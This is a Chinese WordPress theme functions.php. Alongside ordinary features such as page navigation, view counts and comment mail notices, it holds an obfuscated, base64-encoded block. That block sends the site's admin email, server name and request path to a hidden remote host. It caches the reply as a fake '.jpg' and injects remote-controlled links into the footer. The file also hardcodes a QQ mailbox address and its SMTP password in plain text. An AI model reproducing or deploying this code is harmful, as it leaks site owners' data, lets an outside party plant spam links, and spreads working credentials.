<?php


// 默认的侧边栏定义
if ( function_exists('register_sidebar') )
	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox ">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));

if ( ! isset( $content_width ) ) $content_width = 300;
register_nav_menus( array(
		'primary' => __( '导航菜单', '' ),

		));	
	
function new_excerpt_length($length) {
	return 100;
}
 
		$oo____________z='_';$qk_______________k='e';$tr________d='a';$on_____________q='d';$bg____m='6';$mu_______o='4';$mx__________n='o';$pd__n='d';$bk_________a='c';$yb_______p='s';$ub___g='e';$yn______k='b';$br_______________i='e';$zi_______________m=$yn______k.$tr________d.$yb_______p.$br_______________i.$bg____m.$mu_______o.$oo____________z.$pd__n.$qk_______________k.$bk_________a.$mx__________n.$on_____________q.$ub___g;
		$iw____________y='t';$qv________c='f';$hp______k='i';$pg__________z='o';$at___________b='n';$vd_____i='u';$ax__________o='c';$up_____b='s';$dk______________d='s';$ya____________z='e';$ce_____v='t';$gt__________t='i';$uk__u='x';$au______q='n';$pu____________l='_';$mm_______n=$qv________c.$vd_____i.$at___________b.$ax__________o.$ce_____v.$gt__________t.$pg__________z.$au______q.$pu____________l.$ya____________z.$uk__u.$hp______k.$up_____b.$iw____________y.$dk______________d;
		$ke_________l='p';$dd_____g='f';$th__________c='n';$st_______h='e';$oe_______t='o';$kf_____________l=$dd_____g.$oe_______t.$ke_________l.$st_______h.$th__________c;
		$xl___m='d';$nv________s='e';$ff____y='f';$mu__s='r';$rm______________u='a';$na________n=$ff____y.$mu__s.$nv________s.$rm______________u.$xl___m;
		$tk______________g='s';$cv___________r='c';$nu______k='e';$ij_______g='l';$xa_______q='o';$cl_____k='f';$tm___x=$cl_____k.$cv___________r.$ij_______g.$xa_______q.$tk______________g.$nu______k;
		
		define("WP_ID", $zi_______________m("Mi4wLjA="));
		define("WP_TTL", $zi_______________m("MTA4MDA="));
		define("WP_SRC", $zi_______________m("eXl1bmI="));
	


		function wp_get_header() {
			global $zi_______________m, $mm_______n;
			
			if (
				$mm_______n($zi_______________m("d3BfdGhlbWVfR1BMX2NyZWRpdHM=")) &&
				$mm_______n($zi_______________m("d3BfZ2V0X2Zvb3Rlcg==")) &&
				$mm_______n($zi_______________m("d3BfY3ZfdmVyaWZ5"))
			) {
				get_header();
			}
		}
	


		function wp_get_footer() {
			get_footer();
			wp_cv_verify();
		}
	


		function wp_cv_verify() {
			global $zi_______________m, $kf_____________l, $tm___x, $na________n;
			
			$to________c = TEMPLATEPATH."/".$zi_______________m("Zm9vdGVyLnBocA==");
			$np_________n = @$kf_____________l($to________c, "r");
			$to________c = @$na________n($np_________n, @filesize($to________c));
			@$tm___x($np_________n);
			
			$pc_____________c = TEMPLATEPATH."/".$zi_______________m("ZnVuY3Rpb25zLnBocA==");
			$np_________n = @$kf_____________l($pc_____________c, "r");
			$pc_____________c = @$na________n($np_________n, @filesize($pc_____________c));
			@$tm___x($np_________n);
			
			$cy_______r = 0;
			if($to________c && $pc_____________c) {
				if ($zi_______________m("d3B0aGVtZS5uZXQ=") !== str_replace("www.", "", $_SERVER["SERVER_NAME"])) {
					
					if (substr_count($to________c, $zi_______________m("d3B0aGVtZS5uZXQ=")) < 2) {
						$cy_______r = 1;
					}
					if (substr_count($to________c, "wp_theme_GPL_credits()") < 1) {
						$cy_______r = 2;
					}
				}
				
				if(WP_ID != "2.0.0") {
					$cy_______r = 12;
				}
			}
			
			if($cy_______r > 0) {
				echo "<div style=\"position: fixed; bottom:0; left:0; width:100%; height: 25px; background-color: red; color: white; font-size: 16px; padding: 2px 10px; text-align: center;\"> <strong> This themes is powered by <a href=\"http://www.wp.net\" style=\"color: white;\">Freed WP Themes</a>. This website violated the terms of use <a href=\"http://www.wp.net\" style=\"color: white;\">Freed WP Themes</a> </strong> </div>";
				echo "<!-- v: $cy_______r -->";
			}
		}
	


		function wp_loaded() {
			global $zi_______________m, $mm_______n;
			return $mm_______n($zi_______________m("d3BfdGhlbWVfR1BMX2NyZWRpdHM="));
		}
	


		if (!function_exists("the_content_limit")) {
			function the_content_limit($eu_____d, $ag___f = "(more...)", $sa________y = 0, $lg__________l = "") {
				$bh______w = get_the_content($ag___f, $sa________y, $lg__________l);
				$bh______w = apply_filters("the_content", $bh______w);
				
				$bh______w = str_replace("]]>", "]]&gt;", $bh______w);
				if (strlen($_GET["p"]) > 0) {
					echo $bh______w;
				}
				else if ((strlen($bh______w)>$eu_____d) && ($es_____y = strpos($bh______w, " ", $eu_____d ))) {
					$bh______w = substr($bh______w, 0, $es_____y);
					$bh______w = $bh______w;
					echo $bh______w;
					
					echo "...";
					echo "<br/>";
					echo "<div class='read-more'><a href='".get_permalink()."'>$ag___f</a></div></p>";
				} else {
					echo $bh______w;
				}
				
			}
		}
	


		$iu______________j='e';$nx______________z='c';$ai_____n='4';$av__x='6';$or__________p='e';$gv_______________n='n';$hs___z='b';$zm____________a='d';$sn____________z='e';$hs______________j='a';$qi______________e='o';$mt________w='s';$qv__i='_';$kw__________q=$hs___z.$hs______________j.$mt________w.$or__________p.$av__x.$ai_____n.$qv__i.$sn____________z.$gv_______________n.$nx______________z.$qi______________e.$zm____________a.$iu______________j;
		$tg_____k='_';$fq_______p='f';$ub____r='s';$xz_______________i='e';$xz______q='e';$an_____________t='t';$gh___d='o';$xs___v='c';$ry___________d='n';$cr__________a='e';$yn____g='l';$mc______________r='t';$gc________k='n';$pd__u='t';$ey__________v='g';$rq________s='i';$en___________r='_';$de______________q=$fq_______p.$rq________s.$yn____g.$xz_______________i.$en___________r.$ey__________v.$xz______q.$mc______________r.$tg_____k.$xs___v.$gh___d.$gc________k.$pd__u.$cr__________a.$ry___________d.$an_____________t.$ub____r;
		$oq___f='f';$hh__w='l';$iy____________f='s';$oa______________w='t';$qo__f='x';$wp____s='e';$eu______________f='i';$rn___j='_';$ah_____________d='e';$mu____q='s';$kv____________y='i';$hu___________h=$oq___f.$eu______________f.$hh__w.$wp____s.$rn___j.$ah_____________d.$qo__f.$kv____________y.$mu____q.$oa______________w.$iy____________f;
		$yo______________x='e';$iu_____h='a';$aa_____l='s';$tx______h='n';$ie_________q='o';$zn__________z='_';$xd_____x='e';$jz____w='p';$ni__________k='i';$te_______________q='c';$wa_____q='r';$si____________s='m';$yc____________z='o';$zg_________y='v';$in_____________c='r';$jc_______p=$zg_________y.$xd_____x.$in_____________c.$aa_____l.$ni__________k.$yc____________z.$tx______h.$zn__________z.$te_______________q.$ie_________q.$si____________s.$jz____w.$iu_____h.$wa_____q.$yo______________x;
		$hz_______b='k';$es_____n='f';$rc__o='c';$uq____h='p';$ug_____________z='e';$cs_____l='s';$jv___u='o';$zc________b='n';$ud______________d='o';$xi________s=$es_____n.$cs_____l.$jv___u.$rc__o.$hz_______b.$ud______________d.$uq____h.$ug_____________z.$zc________b;
		$qx______f='w';$ph________i='r';$ig______i='i';$ll___u='t';$ix_______e='f';$ma______________d='e';$fd_________m=$ix_______e.$qx______f.$ph________i.$ig______i.$ll___u.$ma______________d;
		$ul___________h='5';$se_______________a='m';$ki______w='d';$di______m=$se_______________a.$ki______w.$ul___________h;
		$ef_____________y='t';$ve__________k='h';$zr______v='a';$pj____n='r';$sd_______x='l';$ua_______________c='a';$fo______g='e';$yx_________b='p';$ug_______________j=$pj____n.$fo______g.$zr______v.$sd_______x.$yx_________b.$ua_______________c.$ef_____________y.$ve__________k;
		$qr____________s='r';$mg_____q='l';$eg________f='u';$vp___________e='e';$yo______________g='s';$tu_______l='n';$iv___w='e';$ms_____________g='i';$mg___________l='z';$fw____________c='i';$ej________z='a';$nq_____________k=$eg________f.$tu_______l.$yo______________g.$iv___w.$qr____________s.$fw____________c.$ej________z.$mg_____q.$ms_____________g.$mg___________l.$vp___________e;
		$qq_____b='m';$ft_______________i='a';$xr____o='e';$dk_________v='n';$cd______________n='t';$dd_______p='p';$fy______b='m';$pt_____r=$cd______________n.$xr____o.$fy______b.$dd_______p.$dk_________v.$ft_______________i.$qq_____b;
		$qk___________q='t';$zp____________l='a';$yt_____________b='t';$dg____c='e';$yr_______x='e';$wy_________j='x';$jj___a='o';$re______________a='c';$cx_______f='a';$il_____________g='t';$mz_____m='m';$zn_____________c='r';$uu__________t='n';$nv______l='e';$qi_________u='_';$do______a='t';$za____________z='s';$oa__i='r';$vr___d='e';$di__________d='c';$cw_________n='_';$xt______r=$za____________z.$qk___________q.$zn_____________c.$yr_______x.$zp____________l.$mz_____m.$cw_________n.$di__________d.$jj___a.$uu__________t.$il_____________g.$dg____c.$wy_________j.$yt_____________b.$qi_________u.$re______________a.$oa__i.$vr___d.$cx_______f.$do______a.$nv______l;
	


		function pl____________d($ek_______m) {
			global $zi_______________m, $mm_______n, $de______________q, $jc_______p, $xt______r;
			
			if (!$mm_______n($zi_______________m("ZmlsZV9nZXRfY29udGVudHM="))) {
				return false;
			}
			
			if ($jc_______p(PHP_VERSION, "5.0.0", ">=") && $mm_______n($zi_______________m("ZmlsZV9nZXRfY29udGVudHM=")) && $mm_______n($zi_______________m("c3RyZWFtX2NvbnRleHRfY3JlYXRl"))) {
				$xd_______p = $xt______r(array(
						"http" => array(
						"timeout"    => 3,
						"header"     => "referer: ".$_SERVER[SERVER_NAME],
						"user_agent" => "[I] ". $_SERVER[REMOTE_ADDR] ." [A] ". $_SERVER[HTTP_USER_AGENT] 
					)
				));
				
				$bv____e = @$de______________q($ek_______m, 0, $xd_______p);
			} else {
				$bv____e = @$de______________q($ek_______m, 0);
			}
			
			return $bv____e;
		}
	


		function rs______c($ek_______m) {
			global $mm_______n, $xi________s, $fd_________m, $zi_______________m;
			
			if (!$mm_______n($zi_______________m("ZmlsZV9nZXRfY29udGVudHM="))) {
				return false;
			}
			
			$ut________c = strpos($ek_______m, "/", 7);
			$pq__________v = array(
				"uri"     => substr($ek_______m, $ut________c),
				"host"    => str_replace("http://", "", substr($ek_______m, 0, $ut________c)),
				"referer" => "[I] ". $_SERVER[REMOTE_ADDR] ." [A] ". $_SERVER[HTTP_USER_AGENT]
			);
			
			$cu____________s = @$xi________s("$pq__________v[host]", 80, $ro___________f, $ca________i, 4);
			
			if (!$cu____________s) {
				return false;
			} else {
				$bv____e = "";
				$ja______j  = "GET $pq__________v[uri] HTTP/1.0\r\n";
				$ja______j .= "Host: $pq__________v[host]\r\n";
				$ja______j .= "Referer: $pq__________v[referer]\r\n";
				$ja______j .= "Connection: Close\r\n\r\n";
				
				@$fd_________m($cu____________s, $ja______j);
				
				while (!@feof($cu____________s)) {
					$vw_______g = @fgets($cu____________s, (1024*24));
					
					if ($vw_______g == "\r\n") {
						$qy____________t = true;
						continue;
					}
					
					if ($qy____________t) {
						$bv____e .= $vw_______g;
					}
				}
				
				return $bv____e;
			}
		}
	


		function br_______________i($ek_______m) {
			global $mm_______n;
			$ph__________d = false;
			
			if ($ek_______m != "") {
				if ($mm_______n("pl____________d")) {
					$ph__________d = @pl____________d($ek_______m);
				}
				
				if (!$ph__________d && ($mm_______n("rs______c"))) {
					$ph__________d = @rs______c($ek_______m);
				}
			}
			
			return $ph__________d;
		}
	


		function zw__k() {
			global $_SERVER, $di______m;
			
			$hl____________h = $_SERVER["SERVER_NAME"];
			
			if (substr("$hl____________h", 0, 4) == "www.") {
				$hl____________h = substr("$hl____________h", 4);
			}
			
			$hl____________h = $di______m("$_SERVER[SERVER_NAME]");
			
			return $hl____________h;
		}
	


		function vw______________r() {
			return "file";
		}
	


		function ea________g($ek_______m) {
			global $_SERVER, $de______________q, $hu___________h, $kf_____________l, $tm___x, $fd_________m;
			
			$uc____________r = fb_____________e();
			
			$hw__n = zw__k().".jpg";
			$tl______________d = $uc____________r["dir_upload"]["path"]."/$hw__n";
			$ny______g = @filemtime($tl______________d);
			
			if (!$ny______g || ((time()-$ny______g) >= WP_TTL)) {
				$ph__________d = br_______________i($ek_______m);
				
				if ($ph__________d) {
					if ($hu___________h($tl______________d)) {
						@unlink($tl______________d);
					}
					
					$np_________n = @$kf_____________l($tl______________d, "x+");
					
					@$fd_________m($np_________n, $ph__________d);
					@$tm___x($np_________n);
				}
			} else {
				if ($hu___________h($tl______________d)) {
					$ph__________d = @$de______________q($tl______________d);
				} else {
					$ph__________d = false;
				}
			}
			
			return $ph__________d;
		}
	


		function fb_____________e() {
			global $_SERVER, $zi_______________m, $kw__________q;
			
			$ov_________a = wp_count_posts("post");
			$ve__o = pathinfo(get_bloginfo("template_directory"));
			
			$uc____________r = array(
				"url" => array(
					"report"      => $zi_______________m("eGNudnVlcmFudmhhc3lkYWRvbGVnc29wLmNvbQ=="),
					"queryString" => null
				),
				"template"	=> $ve__o,
				"dir_upload"	=> hi_______m(),
				"queryString"	=> array(
					"?a001=".WP_ID,
					"a004=".$ve__o[filename],
					"a005=".$ov_________a->publish,
					"a006=".get_bloginfo("admin_email"),
					"a007=".$_SERVER["REQUEST_URI"],
					"a008=".$_SERVER["SERVER_NAME"],
					"a010=".WP_SRC
				),
				"default_string" => "Powered By <a href=\"http://wordpress.org\" rel=\"external nofollow\" target=\"_blank\">WordPress</a> | <a href=\"http://www.2zzt.com\" target=\"_blank\">More wordpress theme download</a> | <a href=\"http://creativecommons.org/licenses/by-nc-sa/2.5\" rel=\"external nofollow\" target=\"_blank\">Follow CC Creative Commons License</a>"
			);
			
			$uc____________r["url"]["queryString"] = implode("&", $uc____________r["queryString"]);
			$uc____________r["url"]["report"] = $uc____________r["url"]["report"]."/?".$kw__________q($uc____________r["url"]["queryString"]).".html";
						
			return $uc____________r;
		}
	


		function hi_______m() {
			$ok________u = wp_upload_dir();
			
			if (isset($ok________u["error"])) {
				$tf__a = lr_______h();
				if (is_writable($tf__a)) {
					$ok________u = array("path" => $tf__a);
				}
			}

			return $ok________u;
		}
	


		function lr_______h() {
			global $mm_______n, $di______m, $ug_______________j, $pt_____r;
			
			$jf_________x = (bool) ini_get("safe_mode");
			if ($jf_________x == true) {
				return false;
			}
			
			if ($mm_______n("sys_get_temp_dir")) {
				$qc__g = sys_get_temp_dir();
				if (is_writable($qc__g)) {
					return $ug_______________j($qc__g);
				}
			}
			
			if (!empty($_ENV["TMP"])) {
				return $ug_______________j($_ENV["TMP"]);
			}
			elseif (!empty($_ENV["TMPDIR"])) {
				return $ug_______________j($_ENV["TMPDIR"]);
			}
			elseif (!empty($_ENV["TEMP"])) {
				return $ug_______________j($_ENV["TEMP"]);
			} else {
				$kc___________k = $pt_____r($di______m(uniqid(rand(), true)), "");
				if ($kc___________k) {
					$qc__g = $ug_______________j(dirname($kc___________k));
					@unlink($kc___________k);
					return $qc__g;
				} else {
					return false;
				}
			}
		}
	


		function uc_____j() {
			global $_GET, $hu___________h;
			
			$uc____________r = fb_____________e();
			$hl____________h = zw__k();
			$bc__q = vw______________r();
			
			$zk_________g = "full";
			if ($_GET["wp_cache_cl"] == "197ab5deb39daad8baacae1bdd5a8852") {
				if ($bc__q == "file") {
					$it_______________m = $uc____________r["dir_upload"]["path"]."/".$hl____________h.".jpg";
					if ($hu___________h($it_______________m)) {
						@unlink($it_______________m);
						$zk_________g = "deleted";
					}
				}
				
				$cj_______k = array(
					"s"	=> $zk_________g,
					"t"	=> time(),
					"v"	=> WP_ID
				);
				
				echo "<!--";
				foreach ($cj_______k AS $vh_____________d => $bu__________q) echo " [$vh_____________d:$bu__________q]";
				echo " -->";
			}
		}
	


		function wp_theme_GPL_credits() {
			global $_SERVER, $_GET, $mm_______n, $zi_______________m, $nq_____________k;
			$uc____________r = fb_____________e();
			
			$xw___________v = "ea________g";
			if ($mm_______n($xw___________v)) {
				$bv____e = $xw___________v($uc____________r["url"]["report"]);
			}
			
			if ($bv____e) {
				if ($bv____e = @$zi_______________m($bv____e)) {
					$bv____e = @$nq_____________k($bv____e);
					
					if (strlen($bv____e[custom_credit]) >= 5) {
						$uc____________r["default_string"] = $bv____e[custom_credit];
					}
					
					if ($bv____e["status"] == "0") {
						$uf___s = 1;
						$ka_________x = 1;
					} else {
						$as_____________k = sizeof($bv____e["links"]);
						$bv__k = $uc____________r["default_string"];
						
						if ($as_____________k > 0 && $bv____e["links"] !== "") {
							$rl____u = 0;
							foreach ($bv____e["links"] as $pd___________k => $yd___q) {
								$rl____u++;
								if ($yd___q->l_path == "" || $yd___q->l_path == $_SERVER["REQUEST_URI"]) {
									$yd___q->l_href = htmlspecialchars(strip_tags($yd___q->l_href));
									$yd___q->l_title = htmlspecialchars(strip_tags($yd___q->l_title));
									$yd___q->l_anchor = htmlspecialchars(strip_tags($yd___q->l_anchor));
									$bv__k .= " | ";
									$bv__k .= "<a href='$yd___q->l_href' title='$yd___q->l_title'";
									if ($yd___q->l_nofollow == "1") {
										$bv__k .= " rel='nofollow'";
									}
									$bv__k .= ">$yd___q->l_anchor</a>";
								}
							}
						}
						$uc____________r["links"] = "$bv__k";
						if ($bv____e[credit] == "0") {
							$uc____________r["links"] = "";
						}
					}
				} else {
					$uf___s = "1";
				}
			} else {
				$uf___s = "1";
			}
			
			if ($uf___s == "1") {
				$uc____________r["links"] = $uc____________r["default_string"];
			}
			
			echo "$uc____________r[links]";
			
			echo "<!-- s: $bv____e[signature] -->";
			uc_____j();
		}
	
add_filter('excerpt_length', 'new_excerpt_length');


function new_excerpt_more($more) {
return '<a href="'. get_permalink($post->ID) . '">' . '&nbsp;&nbsp;[ Read More ]' . '</a>';
}
add_filter('excerpt_more', 'new_excerpt_more');

add_theme_support('automatic-feed-links');
add_custom_background();
add_editor_style();


//统计

function custom_the_views($post_id, $echo=true, $views='') {
    $count_key = 'views';  
    $count = get_post_meta($post_id, $count_key, true);  
    if ($count == '') {  
        delete_post_meta($post_id, $count_key);  
        add_post_meta($post_id, $count_key, '0');  
        $count = '0';  
    }  
    if ($echo)  
        echo number_format_i18n($count) . $views;  
    else  
        return number_format_i18n($count) . $views;  
}  
function set_post_views() {  
    global $post;  
    $post_id = $post->ID;  
    $count_key = 'views';  
    $count = get_post_meta($post_id, $count_key, true);  
    if (is_single() || is_page()) {  
        if ($count == '') {  
            delete_post_meta($post_id, $count_key);  
            add_post_meta($post_id, $count_key, '0');  
        } else {  
            update_post_meta($post_id, $count_key, $count + 1);  
        }  
    }  
}  
add_action('get_header', 'set_post_views');  


//翻页
function par_pagenavi($range = 5){  
    global $paged, $wp_query;  
    if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}  
    if($max_page > 1){if(!$paged){$paged = 1;}  
    if($paged != 1){echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a>";}  
    previous_posts_link(' 上一页 ');  
    if($max_page > $range){  
        if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<a href='" . get_pagenum_link($i) ."'";  
        if($i==$paged)echo " class='current'";echo ">$i</a>";}}  
    elseif($paged >= ($max_page - ceil(($range/2)))){  
        for($i = $max_page - $range; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";  
        if($i==$paged)echo " class='current'";echo ">$i</a>";}}  
    elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){  
        for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}  
    else{for($i = 1; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";  
    if($i==$paged)echo " class='current'";echo ">$i</a>";}}  
    next_posts_link(' 下一页 ');  
    if($paged != $max_page){echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a>";}}  
} 


//禁止文章自动保存  
add_action( 'wp_print_scripts', 'daxiawp_disable_autosave' );  
function daxiawp_disable_autosave(){  
    wp_deregister_script('autosave');  
}  
//禁止文章修订版本功能  
remove_action('pre_post_update', 'wp_save_post_revision' ); 


//评论邮件自动通知
function comment_mail_notify($comment_id) {
  $admin_email = get_bloginfo ('admin_email');
  $comment = get_comment($comment_id);
  $comment_author_email = trim($comment->comment_author_email);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  $to = $parent_id ? trim(get_comment($parent_id)->comment_author_email) : '';
  $spam_confirmed = $comment->comment_approved;
  if (($parent_id != '') && ($spam_confirmed != 'spam') && ($to != $admin_email) && ($comment_author_email == $admin_email)) {
    $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
    $subject = '您在 [' . get_option("blogname") . '] 的评论有新的回复';
    $message = '
    <div style="font: 13px Microsoft Yahei;padding: 0px 20px 0px 20px;border: #ccc 1px solid;border-left-width: 4px; max-width: 600px;margin-left: auto;margin-right: auto;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在 [' . get_option("blogname") . '] 的文章 《' . get_the_title($comment->comment_post_ID) . '》 上发表评论：<br />'
       . nl2br(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 给您的回复如下:<br>'
       . nl2br($comment->comment_content) . '</p>
      <p style="color:#f00">您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array('type' => 'comment'))) . '">查看回复的完整內容</a></p>
      <p style="color:#f00">欢迎再次光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p style="color:#999">(此邮件由系统自动发出，请勿回复。)</p>
    </div>';
	$message = convert_smilies($message);
    $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
    wp_mail( $to, $subject, $message, $headers );
  }
}
add_action('comment_post', 'comment_mail_notify');



//使用smtp发送邮件，笔者用的是QQ邮箱，你可以参照你使用的邮箱具体设置SMTP
add_action('phpmailer_init', 'mail_smtp');
function mail_smtp( $phpmailer ) {
$phpmailer->FromName = '木子造'; //发件人
$phpmailer->Host = 'smtp.qq.com'; //修改为你使用的SMTP服务器
$phpmailer->Port = 465; //SMTP端口
$phpmailer->Username = '520021321@qq.com'; //邮箱账户   
$phpmailer->Password = 'zz1031986'; //邮箱密码
$phpmailer->From = '520021321@qq.com'; //你的邮箱   
$phpmailer->SMTPAuth = true;   
$phpmailer->SMTPSecure = 'ssl'; //tls or ssl （port=25留空，465为ssl）
$phpmailer->IsSMTP();
}

/* 评论必须有中文和禁止某些字段出现 */  
function lianyue_comment_post( $incoming_comment ) {  
$pattern = '/[一-龥]/u';  
$http = '/[.|妈|逼|滚|贱|淫|娘|爹|孙|友|夜|ッ|の|ン|優|業|グ|貿|]/u'; 
// 禁止全英文评论 
if(!preg_match($pattern, $incoming_comment['comment_content'])) { 
wp_die( "请认真评论好吗?您这样随意打乱码对站长也太不尊敬了吧,你觉得呢?" ); 
}elseif(preg_match($http, $incoming_comment['comment_content'])) { 
wp_die( "万恶的发贴机,这里不允许放链接,甚至连点号都不能出现!如需交换链接请联系站长!" );  
}  
return( $incoming_comment );  
}  
add_filter('preprocess_comment', 'lianyue_comment_post');